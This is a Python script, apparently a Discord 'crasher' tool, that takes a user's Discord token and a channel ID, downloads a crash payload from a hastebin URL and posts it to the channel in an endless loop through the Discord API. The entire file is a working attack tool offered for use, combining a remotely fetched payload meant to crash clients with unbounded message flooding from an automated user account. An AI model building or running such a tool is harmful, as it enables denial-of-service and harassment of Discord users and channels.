import requests
from colorama import Fore, init
import os
from urllib.request import Request, urlopen
init(convert=True)

intro = f"""
                            {Fore.RED}Made by REZIZT. {Fore.CYAN}Zwietracht nacheinander ausnutzen
                                        {Fore.BLUE}https://discord.gg/XgpXMWk2bG
{Fore.RED}                 ▄████▄   ██░ ██  ▄▄▄        ██████  ██░ ██   ██████  ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓
{Fore.RED}                ▒██▀ ▀█  ▓██░ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
{Fore.RED}                ▒▓█    ▄ ▒██▀▀██░▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░░ ▓██▄   ▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
{Fore.RED}                ▒▓▓▄ ▄██▒░▓█ ░██ ░██▄▄▄▄██   ▒   ██▒░▓█ ░██   ▒   ██▒▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ 
{Fore.RED}                ▒ ▓███▀ ░░▓█▒░██▓ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓▒██████▒▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ 
{Fore.RED}                ░ ░▒ ▒  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   
{Fore.RED}                  ░  ▒    ▒ ░▒░ ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░░ ░▒  ░ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    
{Fore.RED}                ░         ░  ░░ ░  ░   ▒   ░  ░  ░   ░  ░░ ░░  ░  ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      
{Fore.RED}                ░ ░       ░  ░  ░      ░  ░      ░   ░  ░  ░      ░               ░  ░    ░ ░   ░           
{Fore.RED}                ░                                                                                                 
{Fore.CYAN}                      ███▄,                              ,╓╖╓,
{Fore.CYAN}                     ╙█████░▒▄'                      ▄███▒▓▓╣╣╢╗
{Fore.CYAN}                        ▀▀█████▄,:                  ▐█████████▓▓▓▄
{Fore.CYAN}                            ` █▓░  █╖               ████████▓▄▓▀██
{Fore.CYAN}                              '██▄▄█▓▒╗,             ███████▀▀▀██▀
{Fore.CYAN}                                ▀█████▓▒╢╖            ▀██▄▄░░░░sT
{Fore.CYAN}                                  ██████▓╬╢╖          └███░░░░░─
{Fore.CYAN}                                   ▀█████▓╣╣▒╣         ███▄µ▒░░
{Fore.CYAN}                                     ▀████▓▓▓▓╫┐       ,██▀▀
{Fore.CYAN}                                       ████▓▓█▓▌@▓▒▓▒▄@▓█▓µ▌\  ┌╖
{Fore.CYAN}                                        ▐███████▓▓▓▓▓▒▄▌╢╢╣▀▒ ,░░░▒▒∩,,
{Fore.CYAN}                                         ▀███████▓█▓▓╩▒▀█▄▒▒▒▄▒░░░|░▒░░]▒
{Fore.CYAN}                                            ▀████████▓▓▓▒▀███Ñ▓▒░▒░░░░░▒▒▒
{Fore.CYAN}                                             ░`▀██████▓▓▓@▒███▒▒▒▒▀▒¢g▄╢▒░
{Fore.CYAN}                                                ▐█████▓▓▓▓╣▓▒██▌▒▒▒▒▒▒▐███▄
{Fore.CYAN}                                               ░ ██████▓▓▓▓▌Ñ▓▓▀██▄▒╢¼████æ▄
{Fore.CYAN}                                                 ▀███████▓███▓▓▓▓█░░░░▀▀▀▀██▄
{Fore.CYAN}                                                ╒█████████▓██▓▓▓▓█▒▒▒▒▒▒▒▒▒░░▄
{Fore.CYAN}                                               ,▓█╣▓██▓▓███████▓▓█▒▒▒╢╢▒▒▒▒▒▒░
{Fore.CYAN}                                              ▄▓█▓▄▓███▓█████████████▄▒╢▓╣▓▓╜
{Fore.CYAN}                                             ▐████▓▓██▓▓▓▓▒▒╢╣╣▒▒▒▀█▀█-└▀▀
                                          {Fore.RED}https://exploiting-{Fore.CYAN}discord-for.fun
                                                 {Fore.RED}http://rezizt{Fore.CYAN}.xyz             
                                            
                                                [{Fore.RED}>{Fore.RESET}]{Fore.CYAN}1{Fore.RESET} Crash
                                            
"""

def crash():
    print(f'[{Fore.RED}>{Fore.RESET}] Your token', end=''); token = str(input('  :  '))
    print(f'[{Fore.RED}>{Fore.RESET}] Channel id', end=''); channel = str(input('  :  '))
    headers = {'Authorization': token}
    crash_code = urlopen(Request("https://hastebin.com/raw/hopupotisa")).read().decode()
    print('Started Crashing...')
    while True:    
        requests.post(f'https://discordapp.com/api/v6/channels/{channel}/messages', headers=headers, json={'content':crash_code})
       




def startMenu():
    print(intro)
    print(f'[{Fore.RED}>{Fore.RESET}] Your choice', end=''); choice = str(input('  :  '))
    if choice == '1':
       os.system('cls')
       crash()

if __name__ == '__main__':
    startMenu()
